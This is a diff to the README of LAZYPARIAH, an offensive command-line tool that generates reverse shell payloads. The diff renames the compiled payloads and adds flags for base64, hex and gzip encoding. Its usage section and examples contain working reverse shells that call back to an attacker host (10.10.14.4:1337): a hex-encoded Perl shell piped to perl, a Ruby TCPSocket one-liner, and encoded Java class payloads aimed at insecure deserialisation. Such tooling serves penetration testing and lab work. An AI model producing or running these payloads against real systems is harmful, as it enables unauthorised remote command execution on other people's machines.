@@ -8,12 +8,13 @@ LAZYPARIAH is a simple and easily installable command-line tool written in pure 
 
 The reverse shell payloads that LAZYPARIAH supports include (but are not limited to):
 
-* C binary payloads (compiled on the fly): `c_binary`, `c_binary_b64`, `c_binary_gzip`, `c_binary_gzip_b64`, `c_binary_hex`, `c_binary_gzip_hex`
+* C binary payloads (compiled on the fly): `c_binary`
 * Ruby payloads: `ruby`, `ruby_b64`, `ruby_hex`, `ruby_c`
 * Base64-encoded Python payloads: `python_b64`
-* Rust binary payloads (compiled on the fly): `rust_binary`, `rust_binary_b64`, `rust_binary_gzip`, `rust_binary_gzip_b64`, `rust_binary_gzip_hex`, `rust_binary_hex`
+* Rust binary payloads (compiled on the fly): `rust_binary`
 * PHP scripts containing base64-encoded Python payloads called via the `system()` function: `php_system_python_b64`
-* Java classes (compiled on the fly): `java_class_binary`, `java_class_b64`, `java_class_gzip_b64`
+* Java classes (compiled on the fly): `java_class`
+* Perl payloads: `perl`, `perl_b64`, `perl_hex`, `perl_c`
 * Simple PHP payloads (targeting specific file descriptors): `php_fd`, `php_fd_c`, `php_fd_tags`
 
 ## Warning
@@ -36,21 +37,14 @@ gem install lazypariah
 Usage:  lazypariah [OPTIONS] <PAYLOAD TYPE> <ATTACKER HOST> <ATTACKER PORT>
 Note:   <ATTACKER HOST> may be an IPv4 address, IPv6 address or hostname.
 
-Example:        lazypariah -u python3_b64 10.10.14.4 1555
-Example:        lazypariah python2_c malicious.local 1337
+Example:        lazypariah -u python_b64 10.10.14.4 1555
+Example:        lazypariah python_c malicious.local 1337
 
 Valid Payloads:
     awk
     bash_tcp
     c_binary
-    c_binary_b64
-    c_binary_gzip
-    c_binary_gzip_b64
-    c_binary_gzip_hex
-    c_binary_hex
-    java_class_b64
-    java_class_binary
-    java_class_gzip_b64
+    java_class
     nc
     nc_pipe
     perl
@@ -71,11 +65,6 @@ Valid Payloads:
     ruby_c
     ruby_hex
     rust_binary
-    rust_binary_b64
-    rust_binary_gzip
-    rust_binary_gzip_b64
-    rust_binary_gzip_hex
-    rust_binary_hex
     socat
 
 Valid Options:
@@ -86,6 +75,11 @@ Valid Options:
     -D, --fd INTEGER                 Specify the file descriptor used by the target for TCP. Required for certain payloads.
     -P, --pv INTEGER                 Specify Python version for payload. Must be either 2 or 3. By default, no version is specified.
     -N, --no-new-line                Do not append a new-line character to the end of the payload.
+        --b64                        Encode a c_binary, rust_binary or java_class payload in base-64.
+        --hex                        Encode a c_binary, rust_binary or java_class payload in hexadecimal.
+        --gzip                       Compress a c_binary, rust_binary or java_class payload using zlib.
+        --gzip_b64                   Compress a c_binary, rust_binary or java_class payload using zlib and encode the result in base-64.
+        --gzip_hex                   Compress a c_binary, rust_binary or java_class payload using zlib and encode the result in hexadecimal.
 ```
 
 ## Further Notes and Examples
@@ -117,9 +111,18 @@ In a similar manner, selecting payloads ending with `_hex` will produce a comman
 echo 75736520536f636b65743b24693d2231302e31302e31342e34223b24703d313333373b736f636b657428532c50465f494e45542c534f434b5f53545245414d2c67657470726f746f62796e616d6528227463702229293b696628636f6e6e65637428532c736f636b616464725f696e2824702c696e65745f61746f6e282469292929297b6f70656e28535444494e2c223e265322293b6f70656e285354444f55542c223e265322293b6f70656e285354444552522c223e265322293b6578656328222f62696e2f7368202d6922293b7d3b | xxd -p -r - | perl
 ```
 
-The exception to this is compiled payloads, such as `c_binary_b64`, `java_class_gzip_b64` and `rust_binary_hex`. Since C, Java and Rust are not interpreted languages, selecting these payloads will simply output the base64-encoded or hexadecimal-encoded data (depending on the payload). If one selects e.g. `java_class_gzip_b64`, the resulting payload should be a base64-encoded gzip-compressed Java class file containing a reverse shell payload. Such payloads may be useful for exploiting insecure deserialisation in a Java web application. For example, the command `lazypariah java_class_gzip_b64 10.10.14.4 1337` should produce the following payload:
+Compiled payloads (`c_binary`, `java_class` and `rust_binary`) have optional command-line arguments for zlib compression (`--gzip`), base64-encoding (`--b64`) and hexadecimal-encoding (`--hex`).
+
+For example, the command `lazypariah --b64 java_class 10.10.14.4 1337` should produce the following output:
+
 ```
-H4sIAGBTu18AA3VTXVcSURTdgzNcoFEUMaU0M7XwC7QsE8xK08LwoyANzVoD3HQUGdfMUPZXfKi1fPG1XrCVq35AP6bVL8jOBUnJGu5sztl3n3vOmTnz/deXbwBG8MqDNvQw9DL0udDvgQMDAkICwgyDLgx54MJ1DzpxQ8CwcEvWTWGV4JYHXRgRcNuDbowKiCgoXxQaxZgIuMMwLv7viph7DPcZJiQ4x/S8bo9LqAn2LEqQJ40sl+CN63k+V9hKczOppXPE1CZsLbM5q22XfIZJhgcMUxI8UzsZvm3rRt4iJ2EUzAyf1kUIM63QhvZGU3EJ7RJahB3Oafm18IJpZLhlTRT0XJabEupPthK2qefXKDic1vNha10ET6t4iEcqYpih0kraPLfDCSOzyW1KOjQYEms4NCzUj1XEMatiTsA8FlQ8wVMVCSRVPBOwiCUVz9HOkFKxjBUVL5CU0HhSxJ+WVKyiXcVLUb/DtKoqnU9v8AylbzjTV+Us3QjH8tsFm3ri2pYEf4WdL9in6PPBlfjfDyAqXkajybO6SUmmTNMwK/K24HJP/H/PMipBsWzNpLqagv+QRUW6s9liIl3dGrer6m2unFDdSLQsrSrKS0R1Vy2ngk/vULRLtyZzhsWzpalbluAmnZ4rDxoxMZpDktK28tbUbSLlYKlC5XWuYK1XvYXk+rHSynG+LZQzQunmO7q9qOUKYg6z3LJN4x2JMiItOtBK3524JPrRcNLXdlk4cMJN7MfeA0iHcKTkr6hJ1fjkxAEUuQhnESx+CFfK525QRg/gme0r4twcgRqR+4uojShk10WcZHsjjLB+F6sDRTS8hzfAyPAV0bh/9DMgl7j6ABNWmfwRUI5Jp7AqJCvCH6DEfj+aPqOZzm9Z2ocr4to/2iPnAiW5+IlK38UH7CFAnXRA9CGVurtC2At2hGm4GFoZOpkwuiqrmxapfX7/EkNAxlXSyxQXoPsa2Q4EfwOw0NwVrQQAAA==
+yv66vgAAADcAXwoAHQApBwAqBwArCAAsCgACAC0KAAIALgoAAgAvBwAwCAAxCgAIADIKACMAMwoAIwA0CgAIADMKACMANQoACAA1CgAIADYKACQANwoAJAA4CgAlADkKACUAOgUAAAAAAAAAMgoAOwA8CgAjAD0HAD4KACMAPwoACABABwBBBwBCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAEMHAEQHAEUBAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEAB3JzLmphdmEMAB4AHwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoDAAeAEYMAEcASAwASQBKAQAPamF2YS9uZXQvU29ja2V0AQAKMTAuMTAuMTQuNAwAHgBLDABMAE0MAE4ATQwATwBQDABRAFIMAFMAVAwAVQBUDABWAFcMAFgAHwcAWQwAWgBbDABcAFQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABdAB8MAF4AHwEAAnJzAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9Qcm9jZXNzAQATamF2YS9pby9JbnB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQAWKExqYXZhL2xhbmcvU3RyaW5nO0kpVgEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBAA5nZXRFcnJvclN0cmVhbQEAD2dldE91dHB1dFN0cmVhbQEAGCgpTGphdmEvaW8vT3V0cHV0U3RyZWFtOwEACGlzQ2xvc2VkAQADKClaAQAJYXZhaWxhYmxlAQADKClJAQAEcmVhZAEABXdyaXRlAQAEKEkpVgEABWZsdXNoAQAQamF2YS9sYW5nL1RocmVhZAEABXNsZWVwAQAEKEopVgEACWV4aXRWYWx1ZQEAB2Rlc3Ryb3kBAAVjbG9zZQAhABwAHQAAAAAAAQABAB4AHwACACAAAAEAAAYACQAAALAqtwABuwACWQS9AANZAxIEU7cABQS2AAa2AAdMuwAIWRIJEQU5twAKTSu2AAtOK7YADDoELLYADToFK7YADjoGLLYADzoHLLYAEJoAXS22ABGeAA8ZBy22ABK2ABOn//AZBLYAEZ4AEBkHGQS2ABK2ABOn/+4ZBbYAEZ4AEBkGGQW2ABK2ABOn/+4ZB7YAFBkGtgAUFAAVuAAXK7YAGFenAAg6CKf/oiu2ABostgAbsQABAJoAnwCiABkAAgAhAAAABgABAAAAAQAiAAAAKgAH/wBGAAgHABwHACMHAAgHACQHACQHACQHACUHACUAAAYSFBRXBwAZBAAmAAAABAABABkAAQAnAAAAAgAo
+```
+
+It is also possible to perform zlib compression on one of the aforementioned compiled payloads before encoding it in either base64 or hexadecimal using the `--gzip_b64` and `--gzip_hex` command-line arguments respectively. For example, the command `lazypariah --gzip_hex java_class 10.10.14.4 1337` should produce the following output:
+
+```
+1f8b08003ca25960000375535d57125114dd83335ca0511431a53433b5f00bb42c13cc4ad3c2f0a3200dcd5a03dc741419d7cc50f6577ca8b57cf1b55eb095ab7e403fa6d52fc8ce0549c91aee6cced9779f7bce9939f3fdd7976f0046f0ca8336f430f432f4b9d0ef810303024202c20c832e0c79e0c2750f3a7143c0b0704bd64d6195e096075d181170db836e8c0a8828285f141ac59808b8c3302efeef8a987b0cf719262438c7f4bc6e8f4ba809f62c4a90278d2c97e08deb793e57d84a7333a9a573c4d4266c2db339ab6d977c864986070c53123c533b19be6deb46de22276114cc0c9fd6450833add086f646537109ed125a841dce69f9b5f0826964b8654d14f45c969b12ea4fb612b6a9e7d728389cd6f3616b5d044fab7888472a6298a1d24ada3cb7c30923b3c96d4a3a3418126b38342cd48f55c431ab624ec03c16543cc153150924553c13b0882515cfd1ce9052b18c15152f9094d07852c49f9654aca25dc54b51bfc3b4aa2a9d4f6ff00ca56f38d357e52cdd08c7f2db059b7ae2da96047f859d2fd8a7e8f3c195f8df0f202a5e46a3c9b3ba4949a64cd3302bf2b6e0724ffc7fcf322a41b16ccda4ba9a82ff904545bab3d962225ddd1ab7abea6dae9c50dd48b42cad2aca4b4475572da7824fef50b44bb7267386c5b3a5a95b96e0269d9e2b0f1a31319a4392d2b6f2d6d46d22e560a942e575ae60ad57bd85e4fab1d2ca71be2d943342e9e63bbabda8e50a620eb3dcb24de31d8932222d3ad04adf9db824fad170d2d776593870c24decc7de03488770a4e4afa849d5f8e4c40114b90867112c7e0857cae76e50460fe099ed2be2dc1c811a91fb8ba88d2864d7459c647b238cb07e17ab034534bc8737c0c8f015d1b87ff4332097b8fa00135699fc11508e49a7b02a242bc21fa0c47e3f9a3ea399ce6f59da872be2da3fda23e70225b9f8894adfc507ec21409d7440f42195babb42d80b768469b8185a193a9930ba2aab9b16a97d7eff124340c655d2cb1417a0fb1ad90e047f03b0d0dc15ad040000
 ```
 
 Some payloads require the user to specify the file descriptor used by the target for TCP connections. One example of such a payload is `php_fd_tags`, which is a simple PHP payload enclosed within PHP tags (`<?php` and `?>`) that targets a specific file descriptor.
@@ -148,8 +151,6 @@ Output of command `lazypariah ruby 10.10.14.4 1337`:
 ```
 require "socket";exit if fork;c=TCPSocket.new("10.10.14.4","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
 ```
-Below is a screenshot showing the `c_binary_gzip_b64` payload in action:
-![Alt text](./c_binary_gzip_b64_demo.png)
 
 ## Author
 Copyright (C) 2020-2021 Peter Bruce Funnell
